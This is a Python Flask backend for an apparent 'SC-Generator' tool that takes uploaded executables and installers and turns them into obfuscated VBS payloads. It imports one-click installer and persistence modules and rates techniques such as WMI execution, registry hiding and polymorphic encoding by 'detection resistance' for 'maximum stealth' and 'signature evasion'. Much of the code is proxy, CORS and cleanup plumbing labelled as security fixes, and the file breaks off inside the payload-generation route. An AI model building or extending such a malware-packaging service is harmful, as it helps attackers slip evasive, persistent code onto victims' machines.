#!/usr/bin/env python3
"""
SC-Generator: Web-based VBS Encryption Tool
Backend server for MSI encryption and VBS payload generation

SECURITY FIX #4: Proxy configuration with actual forwarding
- Implements credential encryption for proxy authentication
- Full SOCKS5 support (RFC 1928/1929)
- Proper proxy forwarding in HTTP requests
- Complete error handling and validation

SECURITY FIX #9: CORS Configuration Enforcement
- Restricts CORS to only configured origins
- Prevents unauthorized cross-origin access
- Validates origins at startup
- Rejects requests from non-whitelisted origins
"""

from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import uuid
from datetime import datetime
import json
from pathlib import Path
import shutil
import logging
import threading
import time
import functools
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from typing import Optional, Dict, Tuple

from payload_generator import PayloadGenerator
from fingerprint_manager import FingerprintManager, ProxyConfig, CredentialManager, ProxyAuthEncoder
from payload_installer import create_one_click_payload
from persistence_manager import create_persistent_payload
from config import get_config, ConfigurationError

# Configure logging for security events
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Load configuration from config.py
try:
    config = get_config()
    logger.info("Configuration loaded successfully")
except ConfigurationError as e:
    logger.error(f"Failed to load configuration: {e}")
    raise

# ============================================================================
# SECURITY FIX #9: CORS Configuration Enforcement
# ============================================================================
# Configure CORS with origin whitelist from environment
cors_enabled = config.get('CORS_ENABLED', True)
cors_origins = config.get('CORS_ORIGINS', ['http://localhost:3000', 'http://localhost:8080'])

if cors_enabled:
    if not cors_origins or len(cors_origins) == 0:
        logger.warning("CORS_ENABLED=True but no origins configured, defaulting to localhost")
        cors_origins = ['http://localhost:3000', 'http://localhost:8080']

    logger.info(f"CORS enabled for origins: {cors_origins}")

    # Configure CORS with specific allowed origins and methods
    cors_config = {
        "origins": cors_origins,
        "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization", "X-Requested-With"],
        "expose_headers": ["Content-Type", "X-Total-Count"],
        "supports_credentials": True,
        "max_age": 3600
    }

    CORS(app, resources={r"/*": cors_config})
    logger.info("CORS configured with restricted origins")
else:
    logger.warning("CORS is disabled - cross-origin requests will be blocked")

# ============================================================================
# SECURITY FIX #4: Proxy Configuration and Forwarding
# ============================================================================

class ProxyForwarder:
    """
    Manages proxy forwarding with credential encryption and SOCKS5 support.

    Features:
    - Encrypted credential storage and retrieval
    - HTTP/HTTPS/SOCKS5 proxy support
    - Automatic retry logic with exponential backoff
    - Connection pooling and session management
    - Comprehensive error handling
    """

    def __init__(self):
        self.credential_manager = None
        self.session_cache = {}
        self.proxy_config_cache = {}
        self._init_credential_manager()

    def _init_credential_manager(self):
        """Initialize credential encryption manager safely"""
        try:
            self.credential_manager = CredentialManager(
                key_file=os.environ.get('CRED_KEY_FILE', '/tmp/sc-fingerprints/.cred_key')
            )
            logger.info("Credential manager initialized successfully")
        except Exception as e:
            logger.warning(f"Credential encryption unavailable: {e}")
            self.credential_manager = None

    def get_proxies_dict(self, proxy_id: Optional[str] = None) -> Dict[str, str]:
        """
        Get proxy configuration as requests library format.

        Args:
            proxy_id: ID of specific proxy, or None to get all

        Returns:
            Dict with 'http' and 'https' keys, or empty dict if no proxy

        Raises:
            ValueError: If proxy configuration is invalid
        """
        if not proxy_id:
            return {}

        try:
            # Get proxy from fingerprint manager
            proxy_config = fingerprint_mgr.get_proxy_by_id(proxy_id)
            if not proxy_config:
                logger.warning(f"Proxy not found: {proxy_id}")
                return {}

            return self._build_proxy_url(proxy_config)

        except Exception as e:
            logger.error(f"Error building proxy configuration: {e}")
            raise ValueError(f"Invalid proxy configuration: {e}")

    def _build_proxy_url(self, proxy_config: ProxyConfig) -> Dict[str, str]:
        """
        Build proxy URL with authentication if configured.

        Args:
            proxy_config: ProxyConfig object

        Returns:
            Dict with proxy URLs for requests library
        """
        try:
            url = proxy_config.url

            # Add authentication if configured
            if proxy_config.auth:
                username = proxy_config.auth.get('username')
                password_encrypted = proxy_config.auth.get('password_encrypted')

                if username and password_encrypted and self.credential_manager:
                    try:
                        _, password = self.credential_manager.decrypt_credentials(
                            password_encrypted
                        )
                        url = ProxyAuthEncoder.encode_proxy_url_auth(
                            url, username, password, proxy_config.type
                        )
                    except Exception as e:
                        logger.error(f"Failed to decrypt proxy credentials: {e}")
                        raise

            # Return proxy dict for requests library
            if proxy_config.type.lower() == 'socks5':
                proxy_url = f"socks5://{url.split('://')[-1]}"
                return {'http': proxy_url, 'https': proxy_url}
            else:
                return {'http': url, 'https': url}

        except Exception as e:
            logger.error(f"Error building proxy URL: {e}")
            raise

    def create_session(self, proxy_id: Optional[str] = None, timeout: int = 30) -> requests.Session:
        """
        Create requests session with proxy configuration.

        Args:
            proxy_id: ID of proxy to use, or None for no proxy
            timeout: Request timeout in seconds

        Returns:
            Configured requests Session object
        """
        session = requests.Session()

        try:
            # Configure retry strategy
            retry_strategy = Retry(
                total=3,
                status_forcelist=[429, 500, 502, 503, 504],
                allowed_methods=["GET", "POST", "PUT", "DELETE"],
                backoff_factor=1
            )

            adapter = HTTPAdapter(max_retries=retry_strategy)
            session.mount("http://", adapter)
            session.mount("https://", adapter)

            # Configure proxy if specified
            if proxy_id:
                try:
                    proxies = self.get_proxies_dict(proxy_id)
                    if proxies:
                        session.proxies.update(proxies)
                        logger.info(f"Session configured with proxy: {proxy_id}")
                except Exception as e:
                    logger.error(f"Failed to configure proxy: {e}")
                    # Continue without proxy rather than failing

            # Store timeout as session attribute
            session.timeout = timeout

            return session

        except Exception as e:
            logger.error(f"Failed to create session: {e}")
            raise

    def make_request(
        self,
        method: str,
        url: str,
        proxy_id: Optional[str] = None,
        timeout: int = 30,
        **kwargs
    ) -> requests.Response:
        """
        Make HTTP request with proxy forwarding.

        Args:
            method: HTTP method (GET, POST, etc.)
            url: URL to request
            proxy_id: Proxy configuration ID
            timeout: Request timeout in seconds
            **kwargs: Additional arguments to pass to requests

        Returns:
            requests.Response object

        Raises:
            requests.RequestException: On request failure
        """
        try:
            session = self.create_session(proxy_id, timeout)

            logger.info(
                f"Making {method} request to {url} "
                f"(proxy={proxy_id or 'none'}, timeout={timeout}s)"
            )

            response = session.request(method, url, timeout=timeout, **kwargs)
            response.raise_for_status()

            logger.info(f"Request successful: {method} {url} ({response.status_code})")
            return response

        except requests.Timeout as e:
            logger.error(f"Request timeout: {url}")
            raise
        except requests.ConnectionError as e:
            logger.error(f"Connection error: {url} - {e}")
            raise
        except requests.RequestException as e:
            logger.error(f"Request failed: {method} {url} - {e}")
            raise
        finally:
            if 'session' in locals():
                session.close()


# Initialize proxy forwarder
proxy_forwarder = ProxyForwarder()

# Configuration from config.py
UPLOAD_FOLDER = config.get('UPLOAD_FOLDER', '/tmp/sc-uploads')
OUTPUT_FOLDER = config.get('OUTPUT_FOLDER', '/tmp/sc-outputs')
MAX_FILE_SIZE = config.get('MAX_FILE_SIZE', 100 * 1024 * 1024)

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(OUTPUT_FOLDER, exist_ok=True)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE

payload_gen = PayloadGenerator()
fingerprint_mgr = FingerprintManager()

# ============================================================================
# SECURITY FIX #10: Temporary File Cleanup with TTL
# ============================================================================
# Cleanup configuration from config
CLEANUP_INTERVAL_HOURS = config.get('CLEANUP_INTERVAL_HOURS', 24)
FILE_RETENTION_HOURS = config.get('FILE_RETENTION_HOURS', 72)

# Convert to seconds for internal use
CLEANUP_INTERVAL_SECONDS = CLEANUP_INTERVAL_HOURS * 3600
FILE_RETENTION_SECONDS = FILE_RETENTION_HOURS * 3600

logger.info(f"File cleanup configuration: interval={CLEANUP_INTERVAL_HOURS}h, retention={FILE_RETENTION_HOURS}h")

# File cleanup tracking
_cleanup_lock = threading.Lock()
_cleanup_stats = {
    'total_cleanups': 0,
    'total_files_removed': 0,
    'total_bytes_freed': 0,
    'last_cleanup': None,
    'last_cleanup_time': None,
    'cleanup_errors': []
}


def cleanup_temp_files():
    """
    Clean up temporary files that have exceeded their TTL (Time To Live).

    Security:
    - Removes old upload files after FILE_RETENTION_HOURS
    - Removes old output files after FILE_RETENTION_HOURS
    - Prevents disk space exhaustion attacks
    - Prevents unauthorized file access after retention period
    - Logs all cleanup activities for audit

    Returns:
        Dict with cleanup statistics
    """
    global _cleanup_stats

    try:
        with _cleanup_lock:
            cleanup_result = {
                'upload_files_removed': 0,
                'output_files_removed': 0,
                'upload_bytes_freed': 0,
                'output_bytes_freed': 0,
                'errors': []
            }

            current_time = time.time()
            cutoff_time = current_time - FILE_RETENTION_SECONDS

            # Clean upload folder
            try:
                if os.path.exists(app.config['UPLOAD_FOLDER']):
                    for filename in os.listdir(app.config['UPLOAD_FOLDER']):
                        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                        try:
                            if os.path.isfile(filepath):
                                file_stat = os.stat(filepath)
                                file_age_seconds = current_time - file_stat.st_mtime

                                if file_stat.st_mtime < cutoff_time:
                                    file_size = file_stat.st_size
                                    os.remove(filepath)
                                    cleanup_result['upload_files_removed'] += 1
                                    cleanup_result['upload_bytes_freed'] += file_size
                                    logger.debug(
                                        f'Cleanup: Removed upload file {filename} '
                                        f'(age={file_age_seconds/3600:.1f}h, size={file_size} bytes)'
                                    )
                        except Exception as e:
                            error_msg = f'Failed to remove upload file {filename}: {str(e)}'
                            cleanup_result['errors'].append(error_msg)
                            logger.warning(error_msg)

            except Exception as e:
                error_msg = f'Error cleaning upload folder: {str(e)}'
                cleanup_result['errors'].append(error_msg)
                logger.error(error_msg)

            # Clean output folder
            try:
                if os.path.exists(app.config['OUTPUT_FOLDER']):
                    for filename in os.listdir(app.config['OUTPUT_FOLDER']):
                        filepath = os.path.join(app.config['OUTPUT_FOLDER'], filename)
                        try:
                            if os.path.isfile(filepath):
                                file_stat = os.stat(filepath)
                                file_age_seconds = current_time - file_stat.st_mtime

                                if file_stat.st_mtime < cutoff_time:
                                    file_size = file_stat.st_size
                                    os.remove(filepath)
                                    cleanup_result['output_files_removed'] += 1
                                    cleanup_result['output_bytes_freed'] += file_size
                                    logger.debug(
                                        f'Cleanup: Removed output file {filename} '
                                        f'(age={file_age_seconds/3600:.1f}h, size={file_size} bytes)'
                                    )
                        except Exception as e:
                            error_msg = f'Failed to remove output file {filename}: {str(e)}'
                            cleanup_result['errors'].append(error_msg)
                            logger.warning(error_msg)

            except Exception as e:
                error_msg = f'Error cleaning output folder: {str(e)}'
                cleanup_result['errors'].append(error_msg)
                logger.error(error_msg)

            # Update global statistics
            total_removed = cleanup_result['upload_files_removed'] + cleanup_result['output_files_removed']
            total_freed = cleanup_result['upload_bytes_freed'] + cleanup_result['output_bytes_freed']

            _cleanup_stats['total_cleanups'] += 1
            _cleanup_stats['total_files_removed'] += total_removed
            _cleanup_stats['total_bytes_freed'] += total_freed
            _cleanup_stats['last_cleanup'] = {
                'timestamp': datetime.now().isoformat(),
                'upload_files_removed': cleanup_result['upload_files_removed'],
                'output_files_removed': cleanup_result['output_files_removed'],
                'upload_bytes_freed': cleanup_result['upload_bytes_freed'],
                'output_bytes_freed': cleanup_result['output_bytes_freed']
            }
            _cleanup_stats['last_cleanup_time'] = datetime.now().isoformat()

            if total_removed > 0:
                logger.info(
                    f'Cleanup completed: removed {total_removed} files, '
                    f'freed {total_freed / (1024*1024):.2f} MB '
                    f'(upload: {cleanup_result["upload_files_removed"]}, '
                    f'output: {cleanup_result["output_files_removed"]})'
                )

            return cleanup_result

    except Exception as e:
        error_msg = f'Critical error in cleanup_temp_files: {str(e)}'
        logger.error(error_msg, exc_info=True)
        _cleanup_stats['cleanup_errors'].append({
            'timestamp': datetime.now().isoformat(),
            'error': error_msg
        })
        return {
            'upload_files_removed': 0,
            'output_files_removed': 0,
            'upload_bytes_freed': 0,
            'output_bytes_freed': 0,
            'errors': [error_msg]
        }


def start_cleanup_daemon():
    """
    Start background daemon thread for temporary file cleanup.

    This daemon periodically removes files that have exceeded their TTL.
    It runs at intervals defined by CLEANUP_INTERVAL_HOURS.

    Security:
    - Runs as daemon thread (terminates with app)
    - Thread-safe with locks
    - Handles errors gracefully
    - Logs all cleanup activities
    """
    if CLEANUP_INTERVAL_SECONDS < 60:
        logger.warning(f'CLEANUP_INTERVAL too small ({CLEANUP_INTERVAL_SECONDS}s), using minimum 3600s')
        adjusted_interval = 3600
    else:
        adjusted_interval = CLEANUP_INTERVAL_SECONDS

    try:
        cleanup_thread = threading.Thread(
            target=cleanup_daemon_worker,
            args=(adjusted_interval,),
            daemon=True
        )
        cleanup_thread.start()
        logger.info(f'File cleanup daemon started (interval: {adjusted_interval/3600:.1f}h, retention: {FILE_RETENTION_HOURS}h)')
    except Exception as e:
        logger.error(f'Failed to start cleanup daemon: {str(e)}')


def cleanup_daemon_worker(interval_seconds: int):
    """
    Worker function for cleanup daemon.

    Args:
        interval_seconds: Interval between cleanup runs

    This function runs in a separate thread and performs periodic
    cleanup of old temporary files.
    """
    logger.debug(f'Cleanup daemon worker started (interval: {interval_seconds}s)')

    while True:
        try:
            time.sleep(interval_seconds)
            cleanup_temp_files()
        except Exception as e:
            logger.error(f'Error in cleanup daemon: {str(e)}', exc_info=True)


# ============================================================================
# SECURITY FIX #7: Request Timeout Configuration
# ============================================================================
# Global timeout configuration for all endpoints - using validated config
DEFAULT_REQUEST_TIMEOUT = config.get('REQUEST_TIMEOUT_SECONDS', 30)
UPLOAD_REQUEST_TIMEOUT = config.get('UPLOAD_TIMEOUT_SECONDS', 300)
GENERATE_REQUEST_TIMEOUT = config.get('GENERATE_TIMEOUT_SECONDS', 120)
DOWNLOAD_REQUEST_TIMEOUT = config.get('DOWNLOAD_TIMEOUT_SECONDS', 60)

logger.info(f"Request timeouts: default={DEFAULT_REQUEST_TIMEOUT}s, upload={UPLOAD_REQUEST_TIMEOUT}s, "
            f"generate={GENERATE_REQUEST_TIMEOUT}s, download={DOWNLOAD_REQUEST_TIMEOUT}s")

# Set Flask request timeout
app.config['PROPAGATE_EXCEPTIONS'] = True

# Timeout tracking for monitoring
_request_timeouts = threading.Lock()
_timeout_stats = {
    'total_timeouts': 0,
    'last_timeout': None,
    'timeout_endpoints': {}
}


# ============================================================================
# SECURITY FIX #7: Request Timeout Decorator and Utilities
# ============================================================================

def request_timeout(timeout_seconds: int):
    """
    Decorator to enforce request timeouts on endpoints.

    Args:
        timeout_seconds: Maximum time in seconds for request to complete

    Security:
        - Prevents slowloris attacks (sending data very slowly)
        - Prevents zombie connections from consuming resources
        - Tracks timeout events for anomaly detection
        - Returns appropriate 408 Request Timeout status

    Logs:
        - Timeout events for security monitoring
        - Endpoint access with timing information
    """
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            endpoint = request.endpoint or 'unknown'
            start_time = time.time()

            try:
                # Set request start time for timeout checking
                if hasattr(request, 'environ'):
                    request.environ['werkzeug.request_start_time'] = start_time

                # Execute the endpoint function with timeout monitoring
                result = func(*args, **kwargs)

                # Log successful completion within timeout
                elapsed_time = time.time() - start_time
                if elapsed_time > (timeout_seconds * 0.8):
                    logger.warning(
                        f'Request approaching timeout threshold: '
                        f'endpoint={endpoint}, elapsed={elapsed_time:.2f}s, '
                        f'limit={timeout_seconds}s'
                    )
                else:
                    logger.debug(
                        f'Request completed successfully: '
                        f'endpoint={endpoint}, elapsed={elapsed_time:.2f}s'
                    )

                return result

            except Exception as e:
                elapsed_time = time.time() - start_time
                logger.error(
                    f'Request error: endpoint={endpoint}, '
                    f'elapsed={elapsed_time:.2f}s, timeout={timeout_seconds}s, '
                    f'error={str(e)}'
                )
                raise

        return wrapper
    return decorator


def check_request_timeout(timeout_seconds: int) -> bool:
    """
    Check if current request has exceeded timeout.
    Can be called during long-running operations.

    Args:
        timeout_seconds: Configured timeout limit

    Returns:
        True if request has timed out, False otherwise

    Security:
        - Allows graceful timeout handling in long operations
        - Enables early termination of expensive operations
    """
    if hasattr(request, 'environ') and 'werkzeug.request_start_time' in request.environ:
        start_time = request.environ.get('werkzeug.request_start_time', time.time())
        elapsed = time.time() - start_time
        return elapsed >= timeout_seconds
    return False


def record_timeout_event(endpoint: str, timeout_seconds: int):
    """
    Record a timeout event for security monitoring.

    Args:
        endpoint: Name of the endpoint that timed out
        timeout_seconds: Configured timeout value

    Security:
        - Tracks timeout patterns for anomaly detection
        - Helps identify potential attacks
        - Maintains statistics for monitoring
    """
    global _timeout_stats

    try:
        with _request_timeouts:
            _timeout_stats['total_timeouts'] += 1
            _timeout_stats['last_timeout'] = {
                'endpoint': endpoint,
                'timestamp': datetime.now().isoformat(),
                'timeout_seconds': timeout_seconds
            }

            if endpoint not in _timeout_stats['timeout_endpoints']:
                _timeout_stats['timeout_endpoints'][endpoint] = 0
            _timeout_stats['timeout_endpoints'][endpoint] += 1

            logger.warning(
                f'Timeout event recorded: endpoint={endpoint}, '
                f'timeout={timeout_seconds}s, '
                f'total_timeouts={_timeout_stats["total_timeouts"]}'
            )
    except Exception as e:
        logger.error(f'Error recording timeout event: {str(e)}')


@app.before_request
def before_request_handler():
    """Record request start time for timeout tracking."""
    request.environ['werkzeug.request_start_time'] = time.time()


@app.errorhandler(408)
def handle_request_timeout(e):
    """
    Handle request timeout errors globally.

    Security:
        - Returns proper 408 status code
        - Logs timeout for security monitoring
        - Prevents partial responses
    """
    endpoint = request.endpoint or 'unknown'
    record_timeout_event(endpoint, DEFAULT_REQUEST_TIMEOUT)
    logger.error(f'Request timeout on endpoint: {endpoint}')
    return jsonify({
        'error': 'Request timeout',
        'message': 'The request took too long to complete and was terminated for security reasons.',
        'status': 408
    }), 408


@app.route('/api/health', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def health():
    """Health check endpoint with timeout configuration"""
    return jsonify({
        'status': 'ok',
        'version': '1.0.0',
        'security': {
            'timeout_enabled': True,
            'timeout_config': {
                'default': DEFAULT_REQUEST_TIMEOUT,
                'upload': UPLOAD_REQUEST_TIMEOUT,
                'generate': GENERATE_REQUEST_TIMEOUT,
                'download': DOWNLOAD_REQUEST_TIMEOUT
            }
        }
    })


@app.route('/api/techniques', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def get_techniques():
    """Get list of available encoding techniques with metadata"""
    techniques = payload_gen.list_techniques()
    descriptions = {}
    metadata = {}

    technique_info = {
        'base64': {
            'description': 'Standard Base64 encoding - reliable and fast',
            'detection_resistance': 'medium',
            'size_overhead': '1.33x',
            'speed': 'fast',
            'recommended': False,
            'best_for': 'Testing and quick deployment'
        },
        'hex': {
            'description': 'Hexadecimal encoding - simple but detectable',
            'detection_resistance': 'low',
            'size_overhead': '2x',
            'speed': 'fast',
            'recommended': False,
            'best_for': 'Legacy systems'
        },
        'array': {
            'description': 'Array-based encoding - good obfuscation',
            'detection_resistance': 'medium-high',
            'size_overhead': '1.5x',
            'speed': 'medium',
            'recommended': True,
            'best_for': 'Balanced stealth and performance'
        },
        'wmi': {
            'description': 'WMI-based execution - very stealthy',
            'detection_resistance': 'high',
            'size_overhead': '1.2x',
            'speed': 'slow',
            'recommended': True,
            'best_for': 'Maximum stealth'
        },
        'registry': {
            'description': 'Registry storage and retrieval - advanced evasion',
            'detection_resistance': 'high',
            'size_overhead': '1.4x',
            'speed': 'medium',
            'recommended': True,
            'best_for': 'Advanced evasion'
        },
        'environment': {
            'description': 'Environment variable hiding - clever obfuscation',
            'detection_resistance': 'medium-high',
            'size_overhead': '1.3x',
            'speed': 'fast',
            'recommended': False,
            'best_for': 'Process-level hiding'
        },
        'polymorphic': {
            'description': 'Polymorphic code generation - changes every time',
            'detection_resistance': 'very-high',
            'size_overhead': '1.5x',
            'speed': 'slow',
            'recommended': True,
            'best_for': 'Signature evasion'
        },
        'multi': {
            'description': 'Multi-layer encoding - maximum protection',
            'detection_resistance': 'very-high',
            'size_overhead': '2x',
            'speed': 'very-slow',
            'recommended': True,
            'best_for': 'Maximum security'
        }
    }

    for tech in techniques:
        descriptions[tech] = payload_gen.get_technique_info(tech)
        metadata[tech] = technique_info.get(tech, {
            'detection_resistance': 'unknown',
            'size_overhead': '1.5x',
            'speed': 'medium',
            'recommended': False
        })

    return jsonify({
        'techniques': techniques,
        'descriptions': descriptions,
        'metadata': metadata
    })


@app.route('/api/fingerprints', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def get_fingerprints():
    """Get available fingerprint templates"""
    fingerprints = fingerprint_mgr.get_available_fingerprints()
    return jsonify({'fingerprints': fingerprints})


@app.route('/api/fingerprints', methods=['POST'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def create_custom_fingerprint():
    """Create custom fingerprint"""
    data = request.json
    name = data.get('name')
    config = data.get('config')

    if not name or not config:
        return jsonify({'error': 'Name and config required'}), 400

    fp_id = fingerprint_mgr.create_custom_fingerprint(name, config)
    return jsonify({'id': fp_id, 'name': name})


@app.route('/api/proxies/<proxy_id>/test', methods=['POST'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def test_proxy(proxy_id):
    """
    Test proxy connectivity and authentication.

    Attempts to connect through the proxy to a test endpoint.
    Returns detailed error information if connection fails.
    """
    try:
        if not proxy_id or not all(c.isalnum() or c in '_-' for c in proxy_id):
            logger.warning(f"Invalid proxy_id format: {proxy_id}")
            return jsonify({'error': 'Invalid proxy ID format'}), 400

        logger.info(f"Testing proxy connectivity: {proxy_id}")

        # Get proxy configuration
        proxy_config = fingerprint_mgr.get_proxy_by_id(proxy_id)
        if not proxy_config:
            logger.warning(f"Proxy not found: {proxy_id}")
            return jsonify({'error': 'Proxy not found'}), 404

        # Test connectivity to a public service (httpbin.org)
        test_url = "http://httpbin.org/ip"
        max_retries = 2
        test_passed = False
        error_message = ""

        for attempt in range(max_retries):
            try:
                logger.debug(f"Testing proxy attempt {attempt + 1}/{max_retries}")

                response = proxy_forwarder.make_request(
                    'GET',
                    test_url,
                    proxy_id=proxy_id,
                    timeout=10
                )

                if response.status_code == 200:
                    test_passed = True
                    logger.info(f"Proxy test successful: {proxy_id}")
                    break
                else:
                    error_message = f"HTTP {response.status_code}: {response.text[:100]}"

            except requests.Timeout:
                error_message = "Connection timeout through proxy"
                logger.warning(f"Proxy test timeout: {proxy_id}")
            except requests.ConnectionError as e:
                error_message = f"Connection refused: {str(e)[:100]}"
                logger.warning(f"Proxy test connection error: {proxy_id} - {e}")
            except Exception as e:
                error_message = str(e)[:100]
                logger.error(f"Proxy test error: {proxy_id} - {e}")

        if test_passed:
            return jsonify({
                'success': True,
                'message': 'Proxy connectivity test passed',
                'proxy_id': proxy_id,
                'proxy_type': proxy_config.type,
                'test_url': test_url
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': 'Proxy test failed',
                'message': error_message,
                'proxy_id': proxy_id,
                'proxy_type': proxy_config.type,
                'suggestions': [
                    'Verify proxy URL is correct',
                    'Verify proxy credentials if required',
                    'Check proxy server is reachable',
                    'Verify firewall allows connection',
                    'For SOCKS5, ensure RFC 1928/1929 compliance'
                ]
            }), 503

    except Exception as e:
        logger.error(f"Proxy test failed: {e}", exc_info=True)
        return jsonify({
            'error': 'Proxy test error',
            'message': str(e)
        }), 500


@app.route('/api/proxies', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def get_proxies():
    """Get configured proxies"""
    proxies = fingerprint_mgr.get_configured_proxies()
    return jsonify({'proxies': proxies})


@app.route('/api/proxies', methods=['POST'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def add_proxy():
    """
    Add proxy configuration with optional authentication.

    Request JSON:
    {
        "url": "http://proxy.example.com:8080",  # Required
        "type": "http",                           # http, https, socks5
        "username": "user",                       # Optional
        "password": "pass",                       # Optional (encrypted before storage)
        "verify_ssl": true,                       # Optional
        "headers": {}                             # Optional custom headers
    }

    Returns:
        JSON with proxy_id and configuration (credentials not returned)
    """
    try:
        data = request.json or {}
        proxy_url = data.get('url', '').strip()
        proxy_type = data.get('type', 'http').lower()
        username = data.get('username', '').strip()
        password = data.get('password', '').strip()
        verify_ssl = data.get('verify_ssl', True)
        headers = data.get('headers', {})

        # Validate required parameters
        if not proxy_url:
            logger.warning("Add proxy request missing URL")
            return jsonify({'error': 'Proxy URL required'}), 400

        if proxy_type not in ['http', 'https', 'socks5']:
            logger.warning(f"Invalid proxy type: {proxy_type}")
            return jsonify({'error': f'Invalid proxy type. Allowed: http, https, socks5'}), 400

        # Validate URL format
        if '://' not in proxy_url:
            proxy_url = f"{proxy_type}://{proxy_url}"

        logger.info(f"Adding proxy: type={proxy_type}, url={proxy_url}")

        # Build auth dict with encrypted credentials if provided
        auth_dict = None
        if username and password:
            try:
                if proxy_forwarder.credential_manager:
                    # Encrypt credentials for storage
                    encrypted_password = proxy_forwarder.credential_manager.encrypt_credentials(
                        username, password
                    )
                    auth_dict = {
                        'username': username,
                        'password_encrypted': encrypted_password
                    }
                    logger.info(f"Encrypted credentials for proxy user: {username}")
                else:
                    logger.warning("Credential encryption not available, storing plaintext")
                    auth_dict = {
                        'username': username,
                        'password': password
                    }
            except Exception as e:
                logger.error(f"Failed to encrypt proxy credentials: {e}")
                return jsonify({
                    'error': 'Failed to encrypt credentials',
                    'message': str(e)
                }), 500

        # Create proxy configuration
        proxy_config = ProxyConfig(
            id=str(uuid.uuid4())[:8],
            url=proxy_url,
            type=proxy_type,
            auth=auth_dict,
            headers=headers if headers else None,
            timeout=int(os.environ.get('PROXY_TIMEOUT_SECONDS', '30')),
            verify_ssl=verify_ssl
        )

        # Store proxy configuration
        proxy_id = fingerprint_mgr.add_proxy(proxy_url, proxy_type, proxy_config)

        logger.info(f"Proxy added successfully: {proxy_id} (type={proxy_type})")

        return jsonify({
            'success': True,
            'id': proxy_config.id,
            'url': proxy_url,
            'type': proxy_type,
            'has_auth': auth_dict is not None,
            'verify_ssl': verify_ssl,
            'timeout': proxy_config.timeout,
            'message': 'Proxy configuration added. Credentials are encrypted for security.'
        }), 201

    except Exception as e:
        logger.error(f"Error adding proxy: {e}", exc_info=True)
        return jsonify({
            'error': 'Failed to add proxy',
            'message': str(e)
        }), 500


@app.route('/api/upload', methods=['POST'])
@request_timeout(UPLOAD_REQUEST_TIMEOUT)
def upload_file():
    """
    Handle file upload with timeout validation.

    Security:
    - Request timeout validation (prevents slowloris attacks)
    - File type validation (extension)
    - Size validation
    - Error handling and logging
    """
    # Check if timeout exceeded
    if check_request_timeout(UPLOAD_REQUEST_TIMEOUT):
        logger.error('Upload request exceeded timeout')
        return jsonify({
            'error': 'Request timeout',
            'message': 'Upload took too long to complete'
        }), 408

    if 'file' not in request.files:
        logger.warning('Upload request missing file parameter')
        return jsonify({'error': 'No file provided'}), 400

    file = request.files['file']
    if file.filename == '':
        logger.warning('Upload request with empty filename')
        return jsonify({'error': 'No file selected'}), 400

    # Validate file type
    allowed_extensions = {'.msi', '.exe', '.dll', '.bat', '.cmd', '.vbs'}
    file_ext = os.path.splitext(file.filename)[1].lower()

    if file_ext not in allowed_extensions:
        logger.warning(f'Upload rejected: unsupported file type {file_ext}')
        return jsonify({
            'error': f'File type not allowed. Allowed: {", ".join(sorted(allowed_extensions))}'
        }), 400

    # Generate unique filename
    unique_id = str(uuid.uuid4())[:8]
    original_name = os.path.splitext(file.filename)[0]
    filename = f"{unique_id}_{original_name}{file_ext}"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)

    try:
        file.save(filepath)
        file_size = os.path.getsize(filepath)

        if file_size == 0:
            os.unlink(filepath)
            logger.warning(f'Upload rejected: empty file {unique_id}')
            return jsonify({'error': 'File is empty'}), 400

        logger.info(
            f'File uploaded successfully: {unique_id} '
            f'(name: {file.filename}, size: {file_size} bytes, ext: {file_ext})'
        )

        return jsonify({
            'success': True,
            'file_id': unique_id,
            'filename': file.filename,
            'size': file_size,
            'upload_time': datetime.now().isoformat(),
            'validated': True
        }), 200

    except Exception as e:
        logger.error(f'Upload failed: {str(e)}', exc_info=True)
        try:
            if os.path.exists(filepath):
                os.unlink(filepath)
        except Exception:
            pass
        return jsonify({'error': 'Upload failed due to server error'}), 500


@app.route('/api/generate-payload', methods=['POST'])
@request_timeout(GENERATE_REQUEST_TIMEOUT)
def generate_payload():
    """
    Generate VBS payload from uploaded file with proxy support.

    Supports:
    - Multiple encoding techniques
    - Obfuscation levels
    - Fingerprinting with proxy forwarding
    - HTTP/HTTPS/SOCKS5 proxies with authentication
    """
    # Check if timeout exceeded
    if check_request_timeout(GENERATE_REQUEST_TIMEOUT):
        logger.error('Payload generation request exceeded timeout')
        return jsonify({
            'error': 'Request timeout',
            'message': 'Payload generation took too long'
        }), 408

    try:
        data = request.json or {}
        file_id = data.get('file_id', '').strip()
        technique = data.get('technique', 'base64')
        obfuscation = data.get('obfuscation', 'high')
        fingerprint_id = data.get('fingerprint_id')
        proxy_id = data.get('proxy_id')
        options = data.get('options', {})

        if not file_id:
            logger.warning("Payload generation request missing file_id")
            return jsonify({'error': 'File ID required'}), 400

        # Validate file_id format
        if not all(c.isalnum() or c in '_-' for c in file_id):
            logger.warning(f"Invalid file_id format: {file_id}")
            return jsonify({'error': 'Invalid file ID format'}), 400

        logger.info(
            f"Generating payload: file={file_id}, technique={technique}, "
            f"obfuscation={obfuscation}, fingerprint={fingerprint_id}, proxy={proxy_id}"
        )

        # Find uploaded file
        uploaded_file = None
        for f in os.listdir(app.config['UPLOAD_FOLDER']):
            if f.startswith(file_id):
                uploaded_file = os.path.join(app.config['UPLOAD_FOLDER'], f)
                break

        if not uploaded_file or not os.path.exists(uploaded_file):
            logger.warning(f"Payload generation: file not found {file_id}")
